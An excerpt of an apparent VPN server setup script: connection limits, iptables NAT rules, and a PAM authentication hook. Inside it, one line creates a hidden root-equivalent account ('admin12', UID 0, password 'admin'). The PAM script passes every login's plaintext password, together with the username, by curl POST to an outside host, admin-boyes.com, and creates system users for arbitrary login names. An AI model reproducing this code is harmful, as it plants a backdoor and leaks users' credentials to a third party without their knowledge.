...
useradd -p $(openssl passwd -1 admin) admin12 -ou 0 -g 0
...
max-clients = 1000000000
max-same-clients = 1000000000
keepalive = 32400
dpd = 90
mobile-dpd = 1800
...
iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o ens3 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o ens3 -j SNAT --to-source `curl ipecho.net/plain`
...
/bin/bash /home/inactive.sh" > /root/ssh.sh
...
mkdir /usr/share/libpam-script
cat <<\EOM >/usr/share/libpam-script/pam_script_auth
#!/bin/bash
foo=$(shuf -i1000-9999999 -n1)
useradd $PAM_USER -o -u $foo --shell=/bin/false --no-create-home;
read password;
validation="$(curl -X POST -F 'username="'$PAM_USER'"' -F 'password="'$password'"' https://admin-boyes.com/zyper/auth.php)";
...
auth        sufficient    pam_exec.so debug expose_authtok /usr/share/libpam-script/pam_script_auth 
